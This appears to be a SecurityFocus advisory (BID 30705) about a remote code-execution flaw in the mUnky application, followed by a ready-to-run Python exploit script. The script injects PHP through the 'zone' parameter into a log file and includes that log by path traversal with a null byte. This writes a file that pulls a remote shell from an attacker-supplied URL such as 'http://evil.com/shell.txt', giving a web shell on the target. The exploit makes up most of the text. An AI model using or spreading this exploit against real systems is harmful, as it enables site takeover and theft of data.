source: http://www.securityfocus.com/bid/30705/info

mUnky is prone to a remote code-execution vulnerability because the application fails to properly sanitize user-supplied input.

Exploiting this issue allows attackers to cause the application to execute arbitrary script code in the context of the application; other attacks are also possible. 

mport httplib,urllib

site=raw_input('Site [Ex www.r3d.com]: ')

path=raw_input('Path [Ex /munky]: ')

shell=raw_input('Shell [Ex http://evil.com/shell.txt]: ')

print "[*]Powered by : R3d.W0rm - r3d.w0rm (at) yahoo (dot) com [email concealed]"

conn=httplib.HTTPConnection(site)

print "[*]Connected to " + site

print "[*]Sending shell code ..."

conn.request('GET',path + "/?zone=<?php%20$fp=fopen('r3d.w0rm.php','w%2B');fwrite($fp,'<?php%20inc
lude%20\\'" + shell + "\\';?>');fclose($fp);?>")

print "[*]Running shell code ..."

data=urllib.urlopen('http://' + site + path + '/?zone=../logs/counts.log%00')

print "[*]Shell created"

print "[*]" + site + path + '/r3d.w0rm.php'
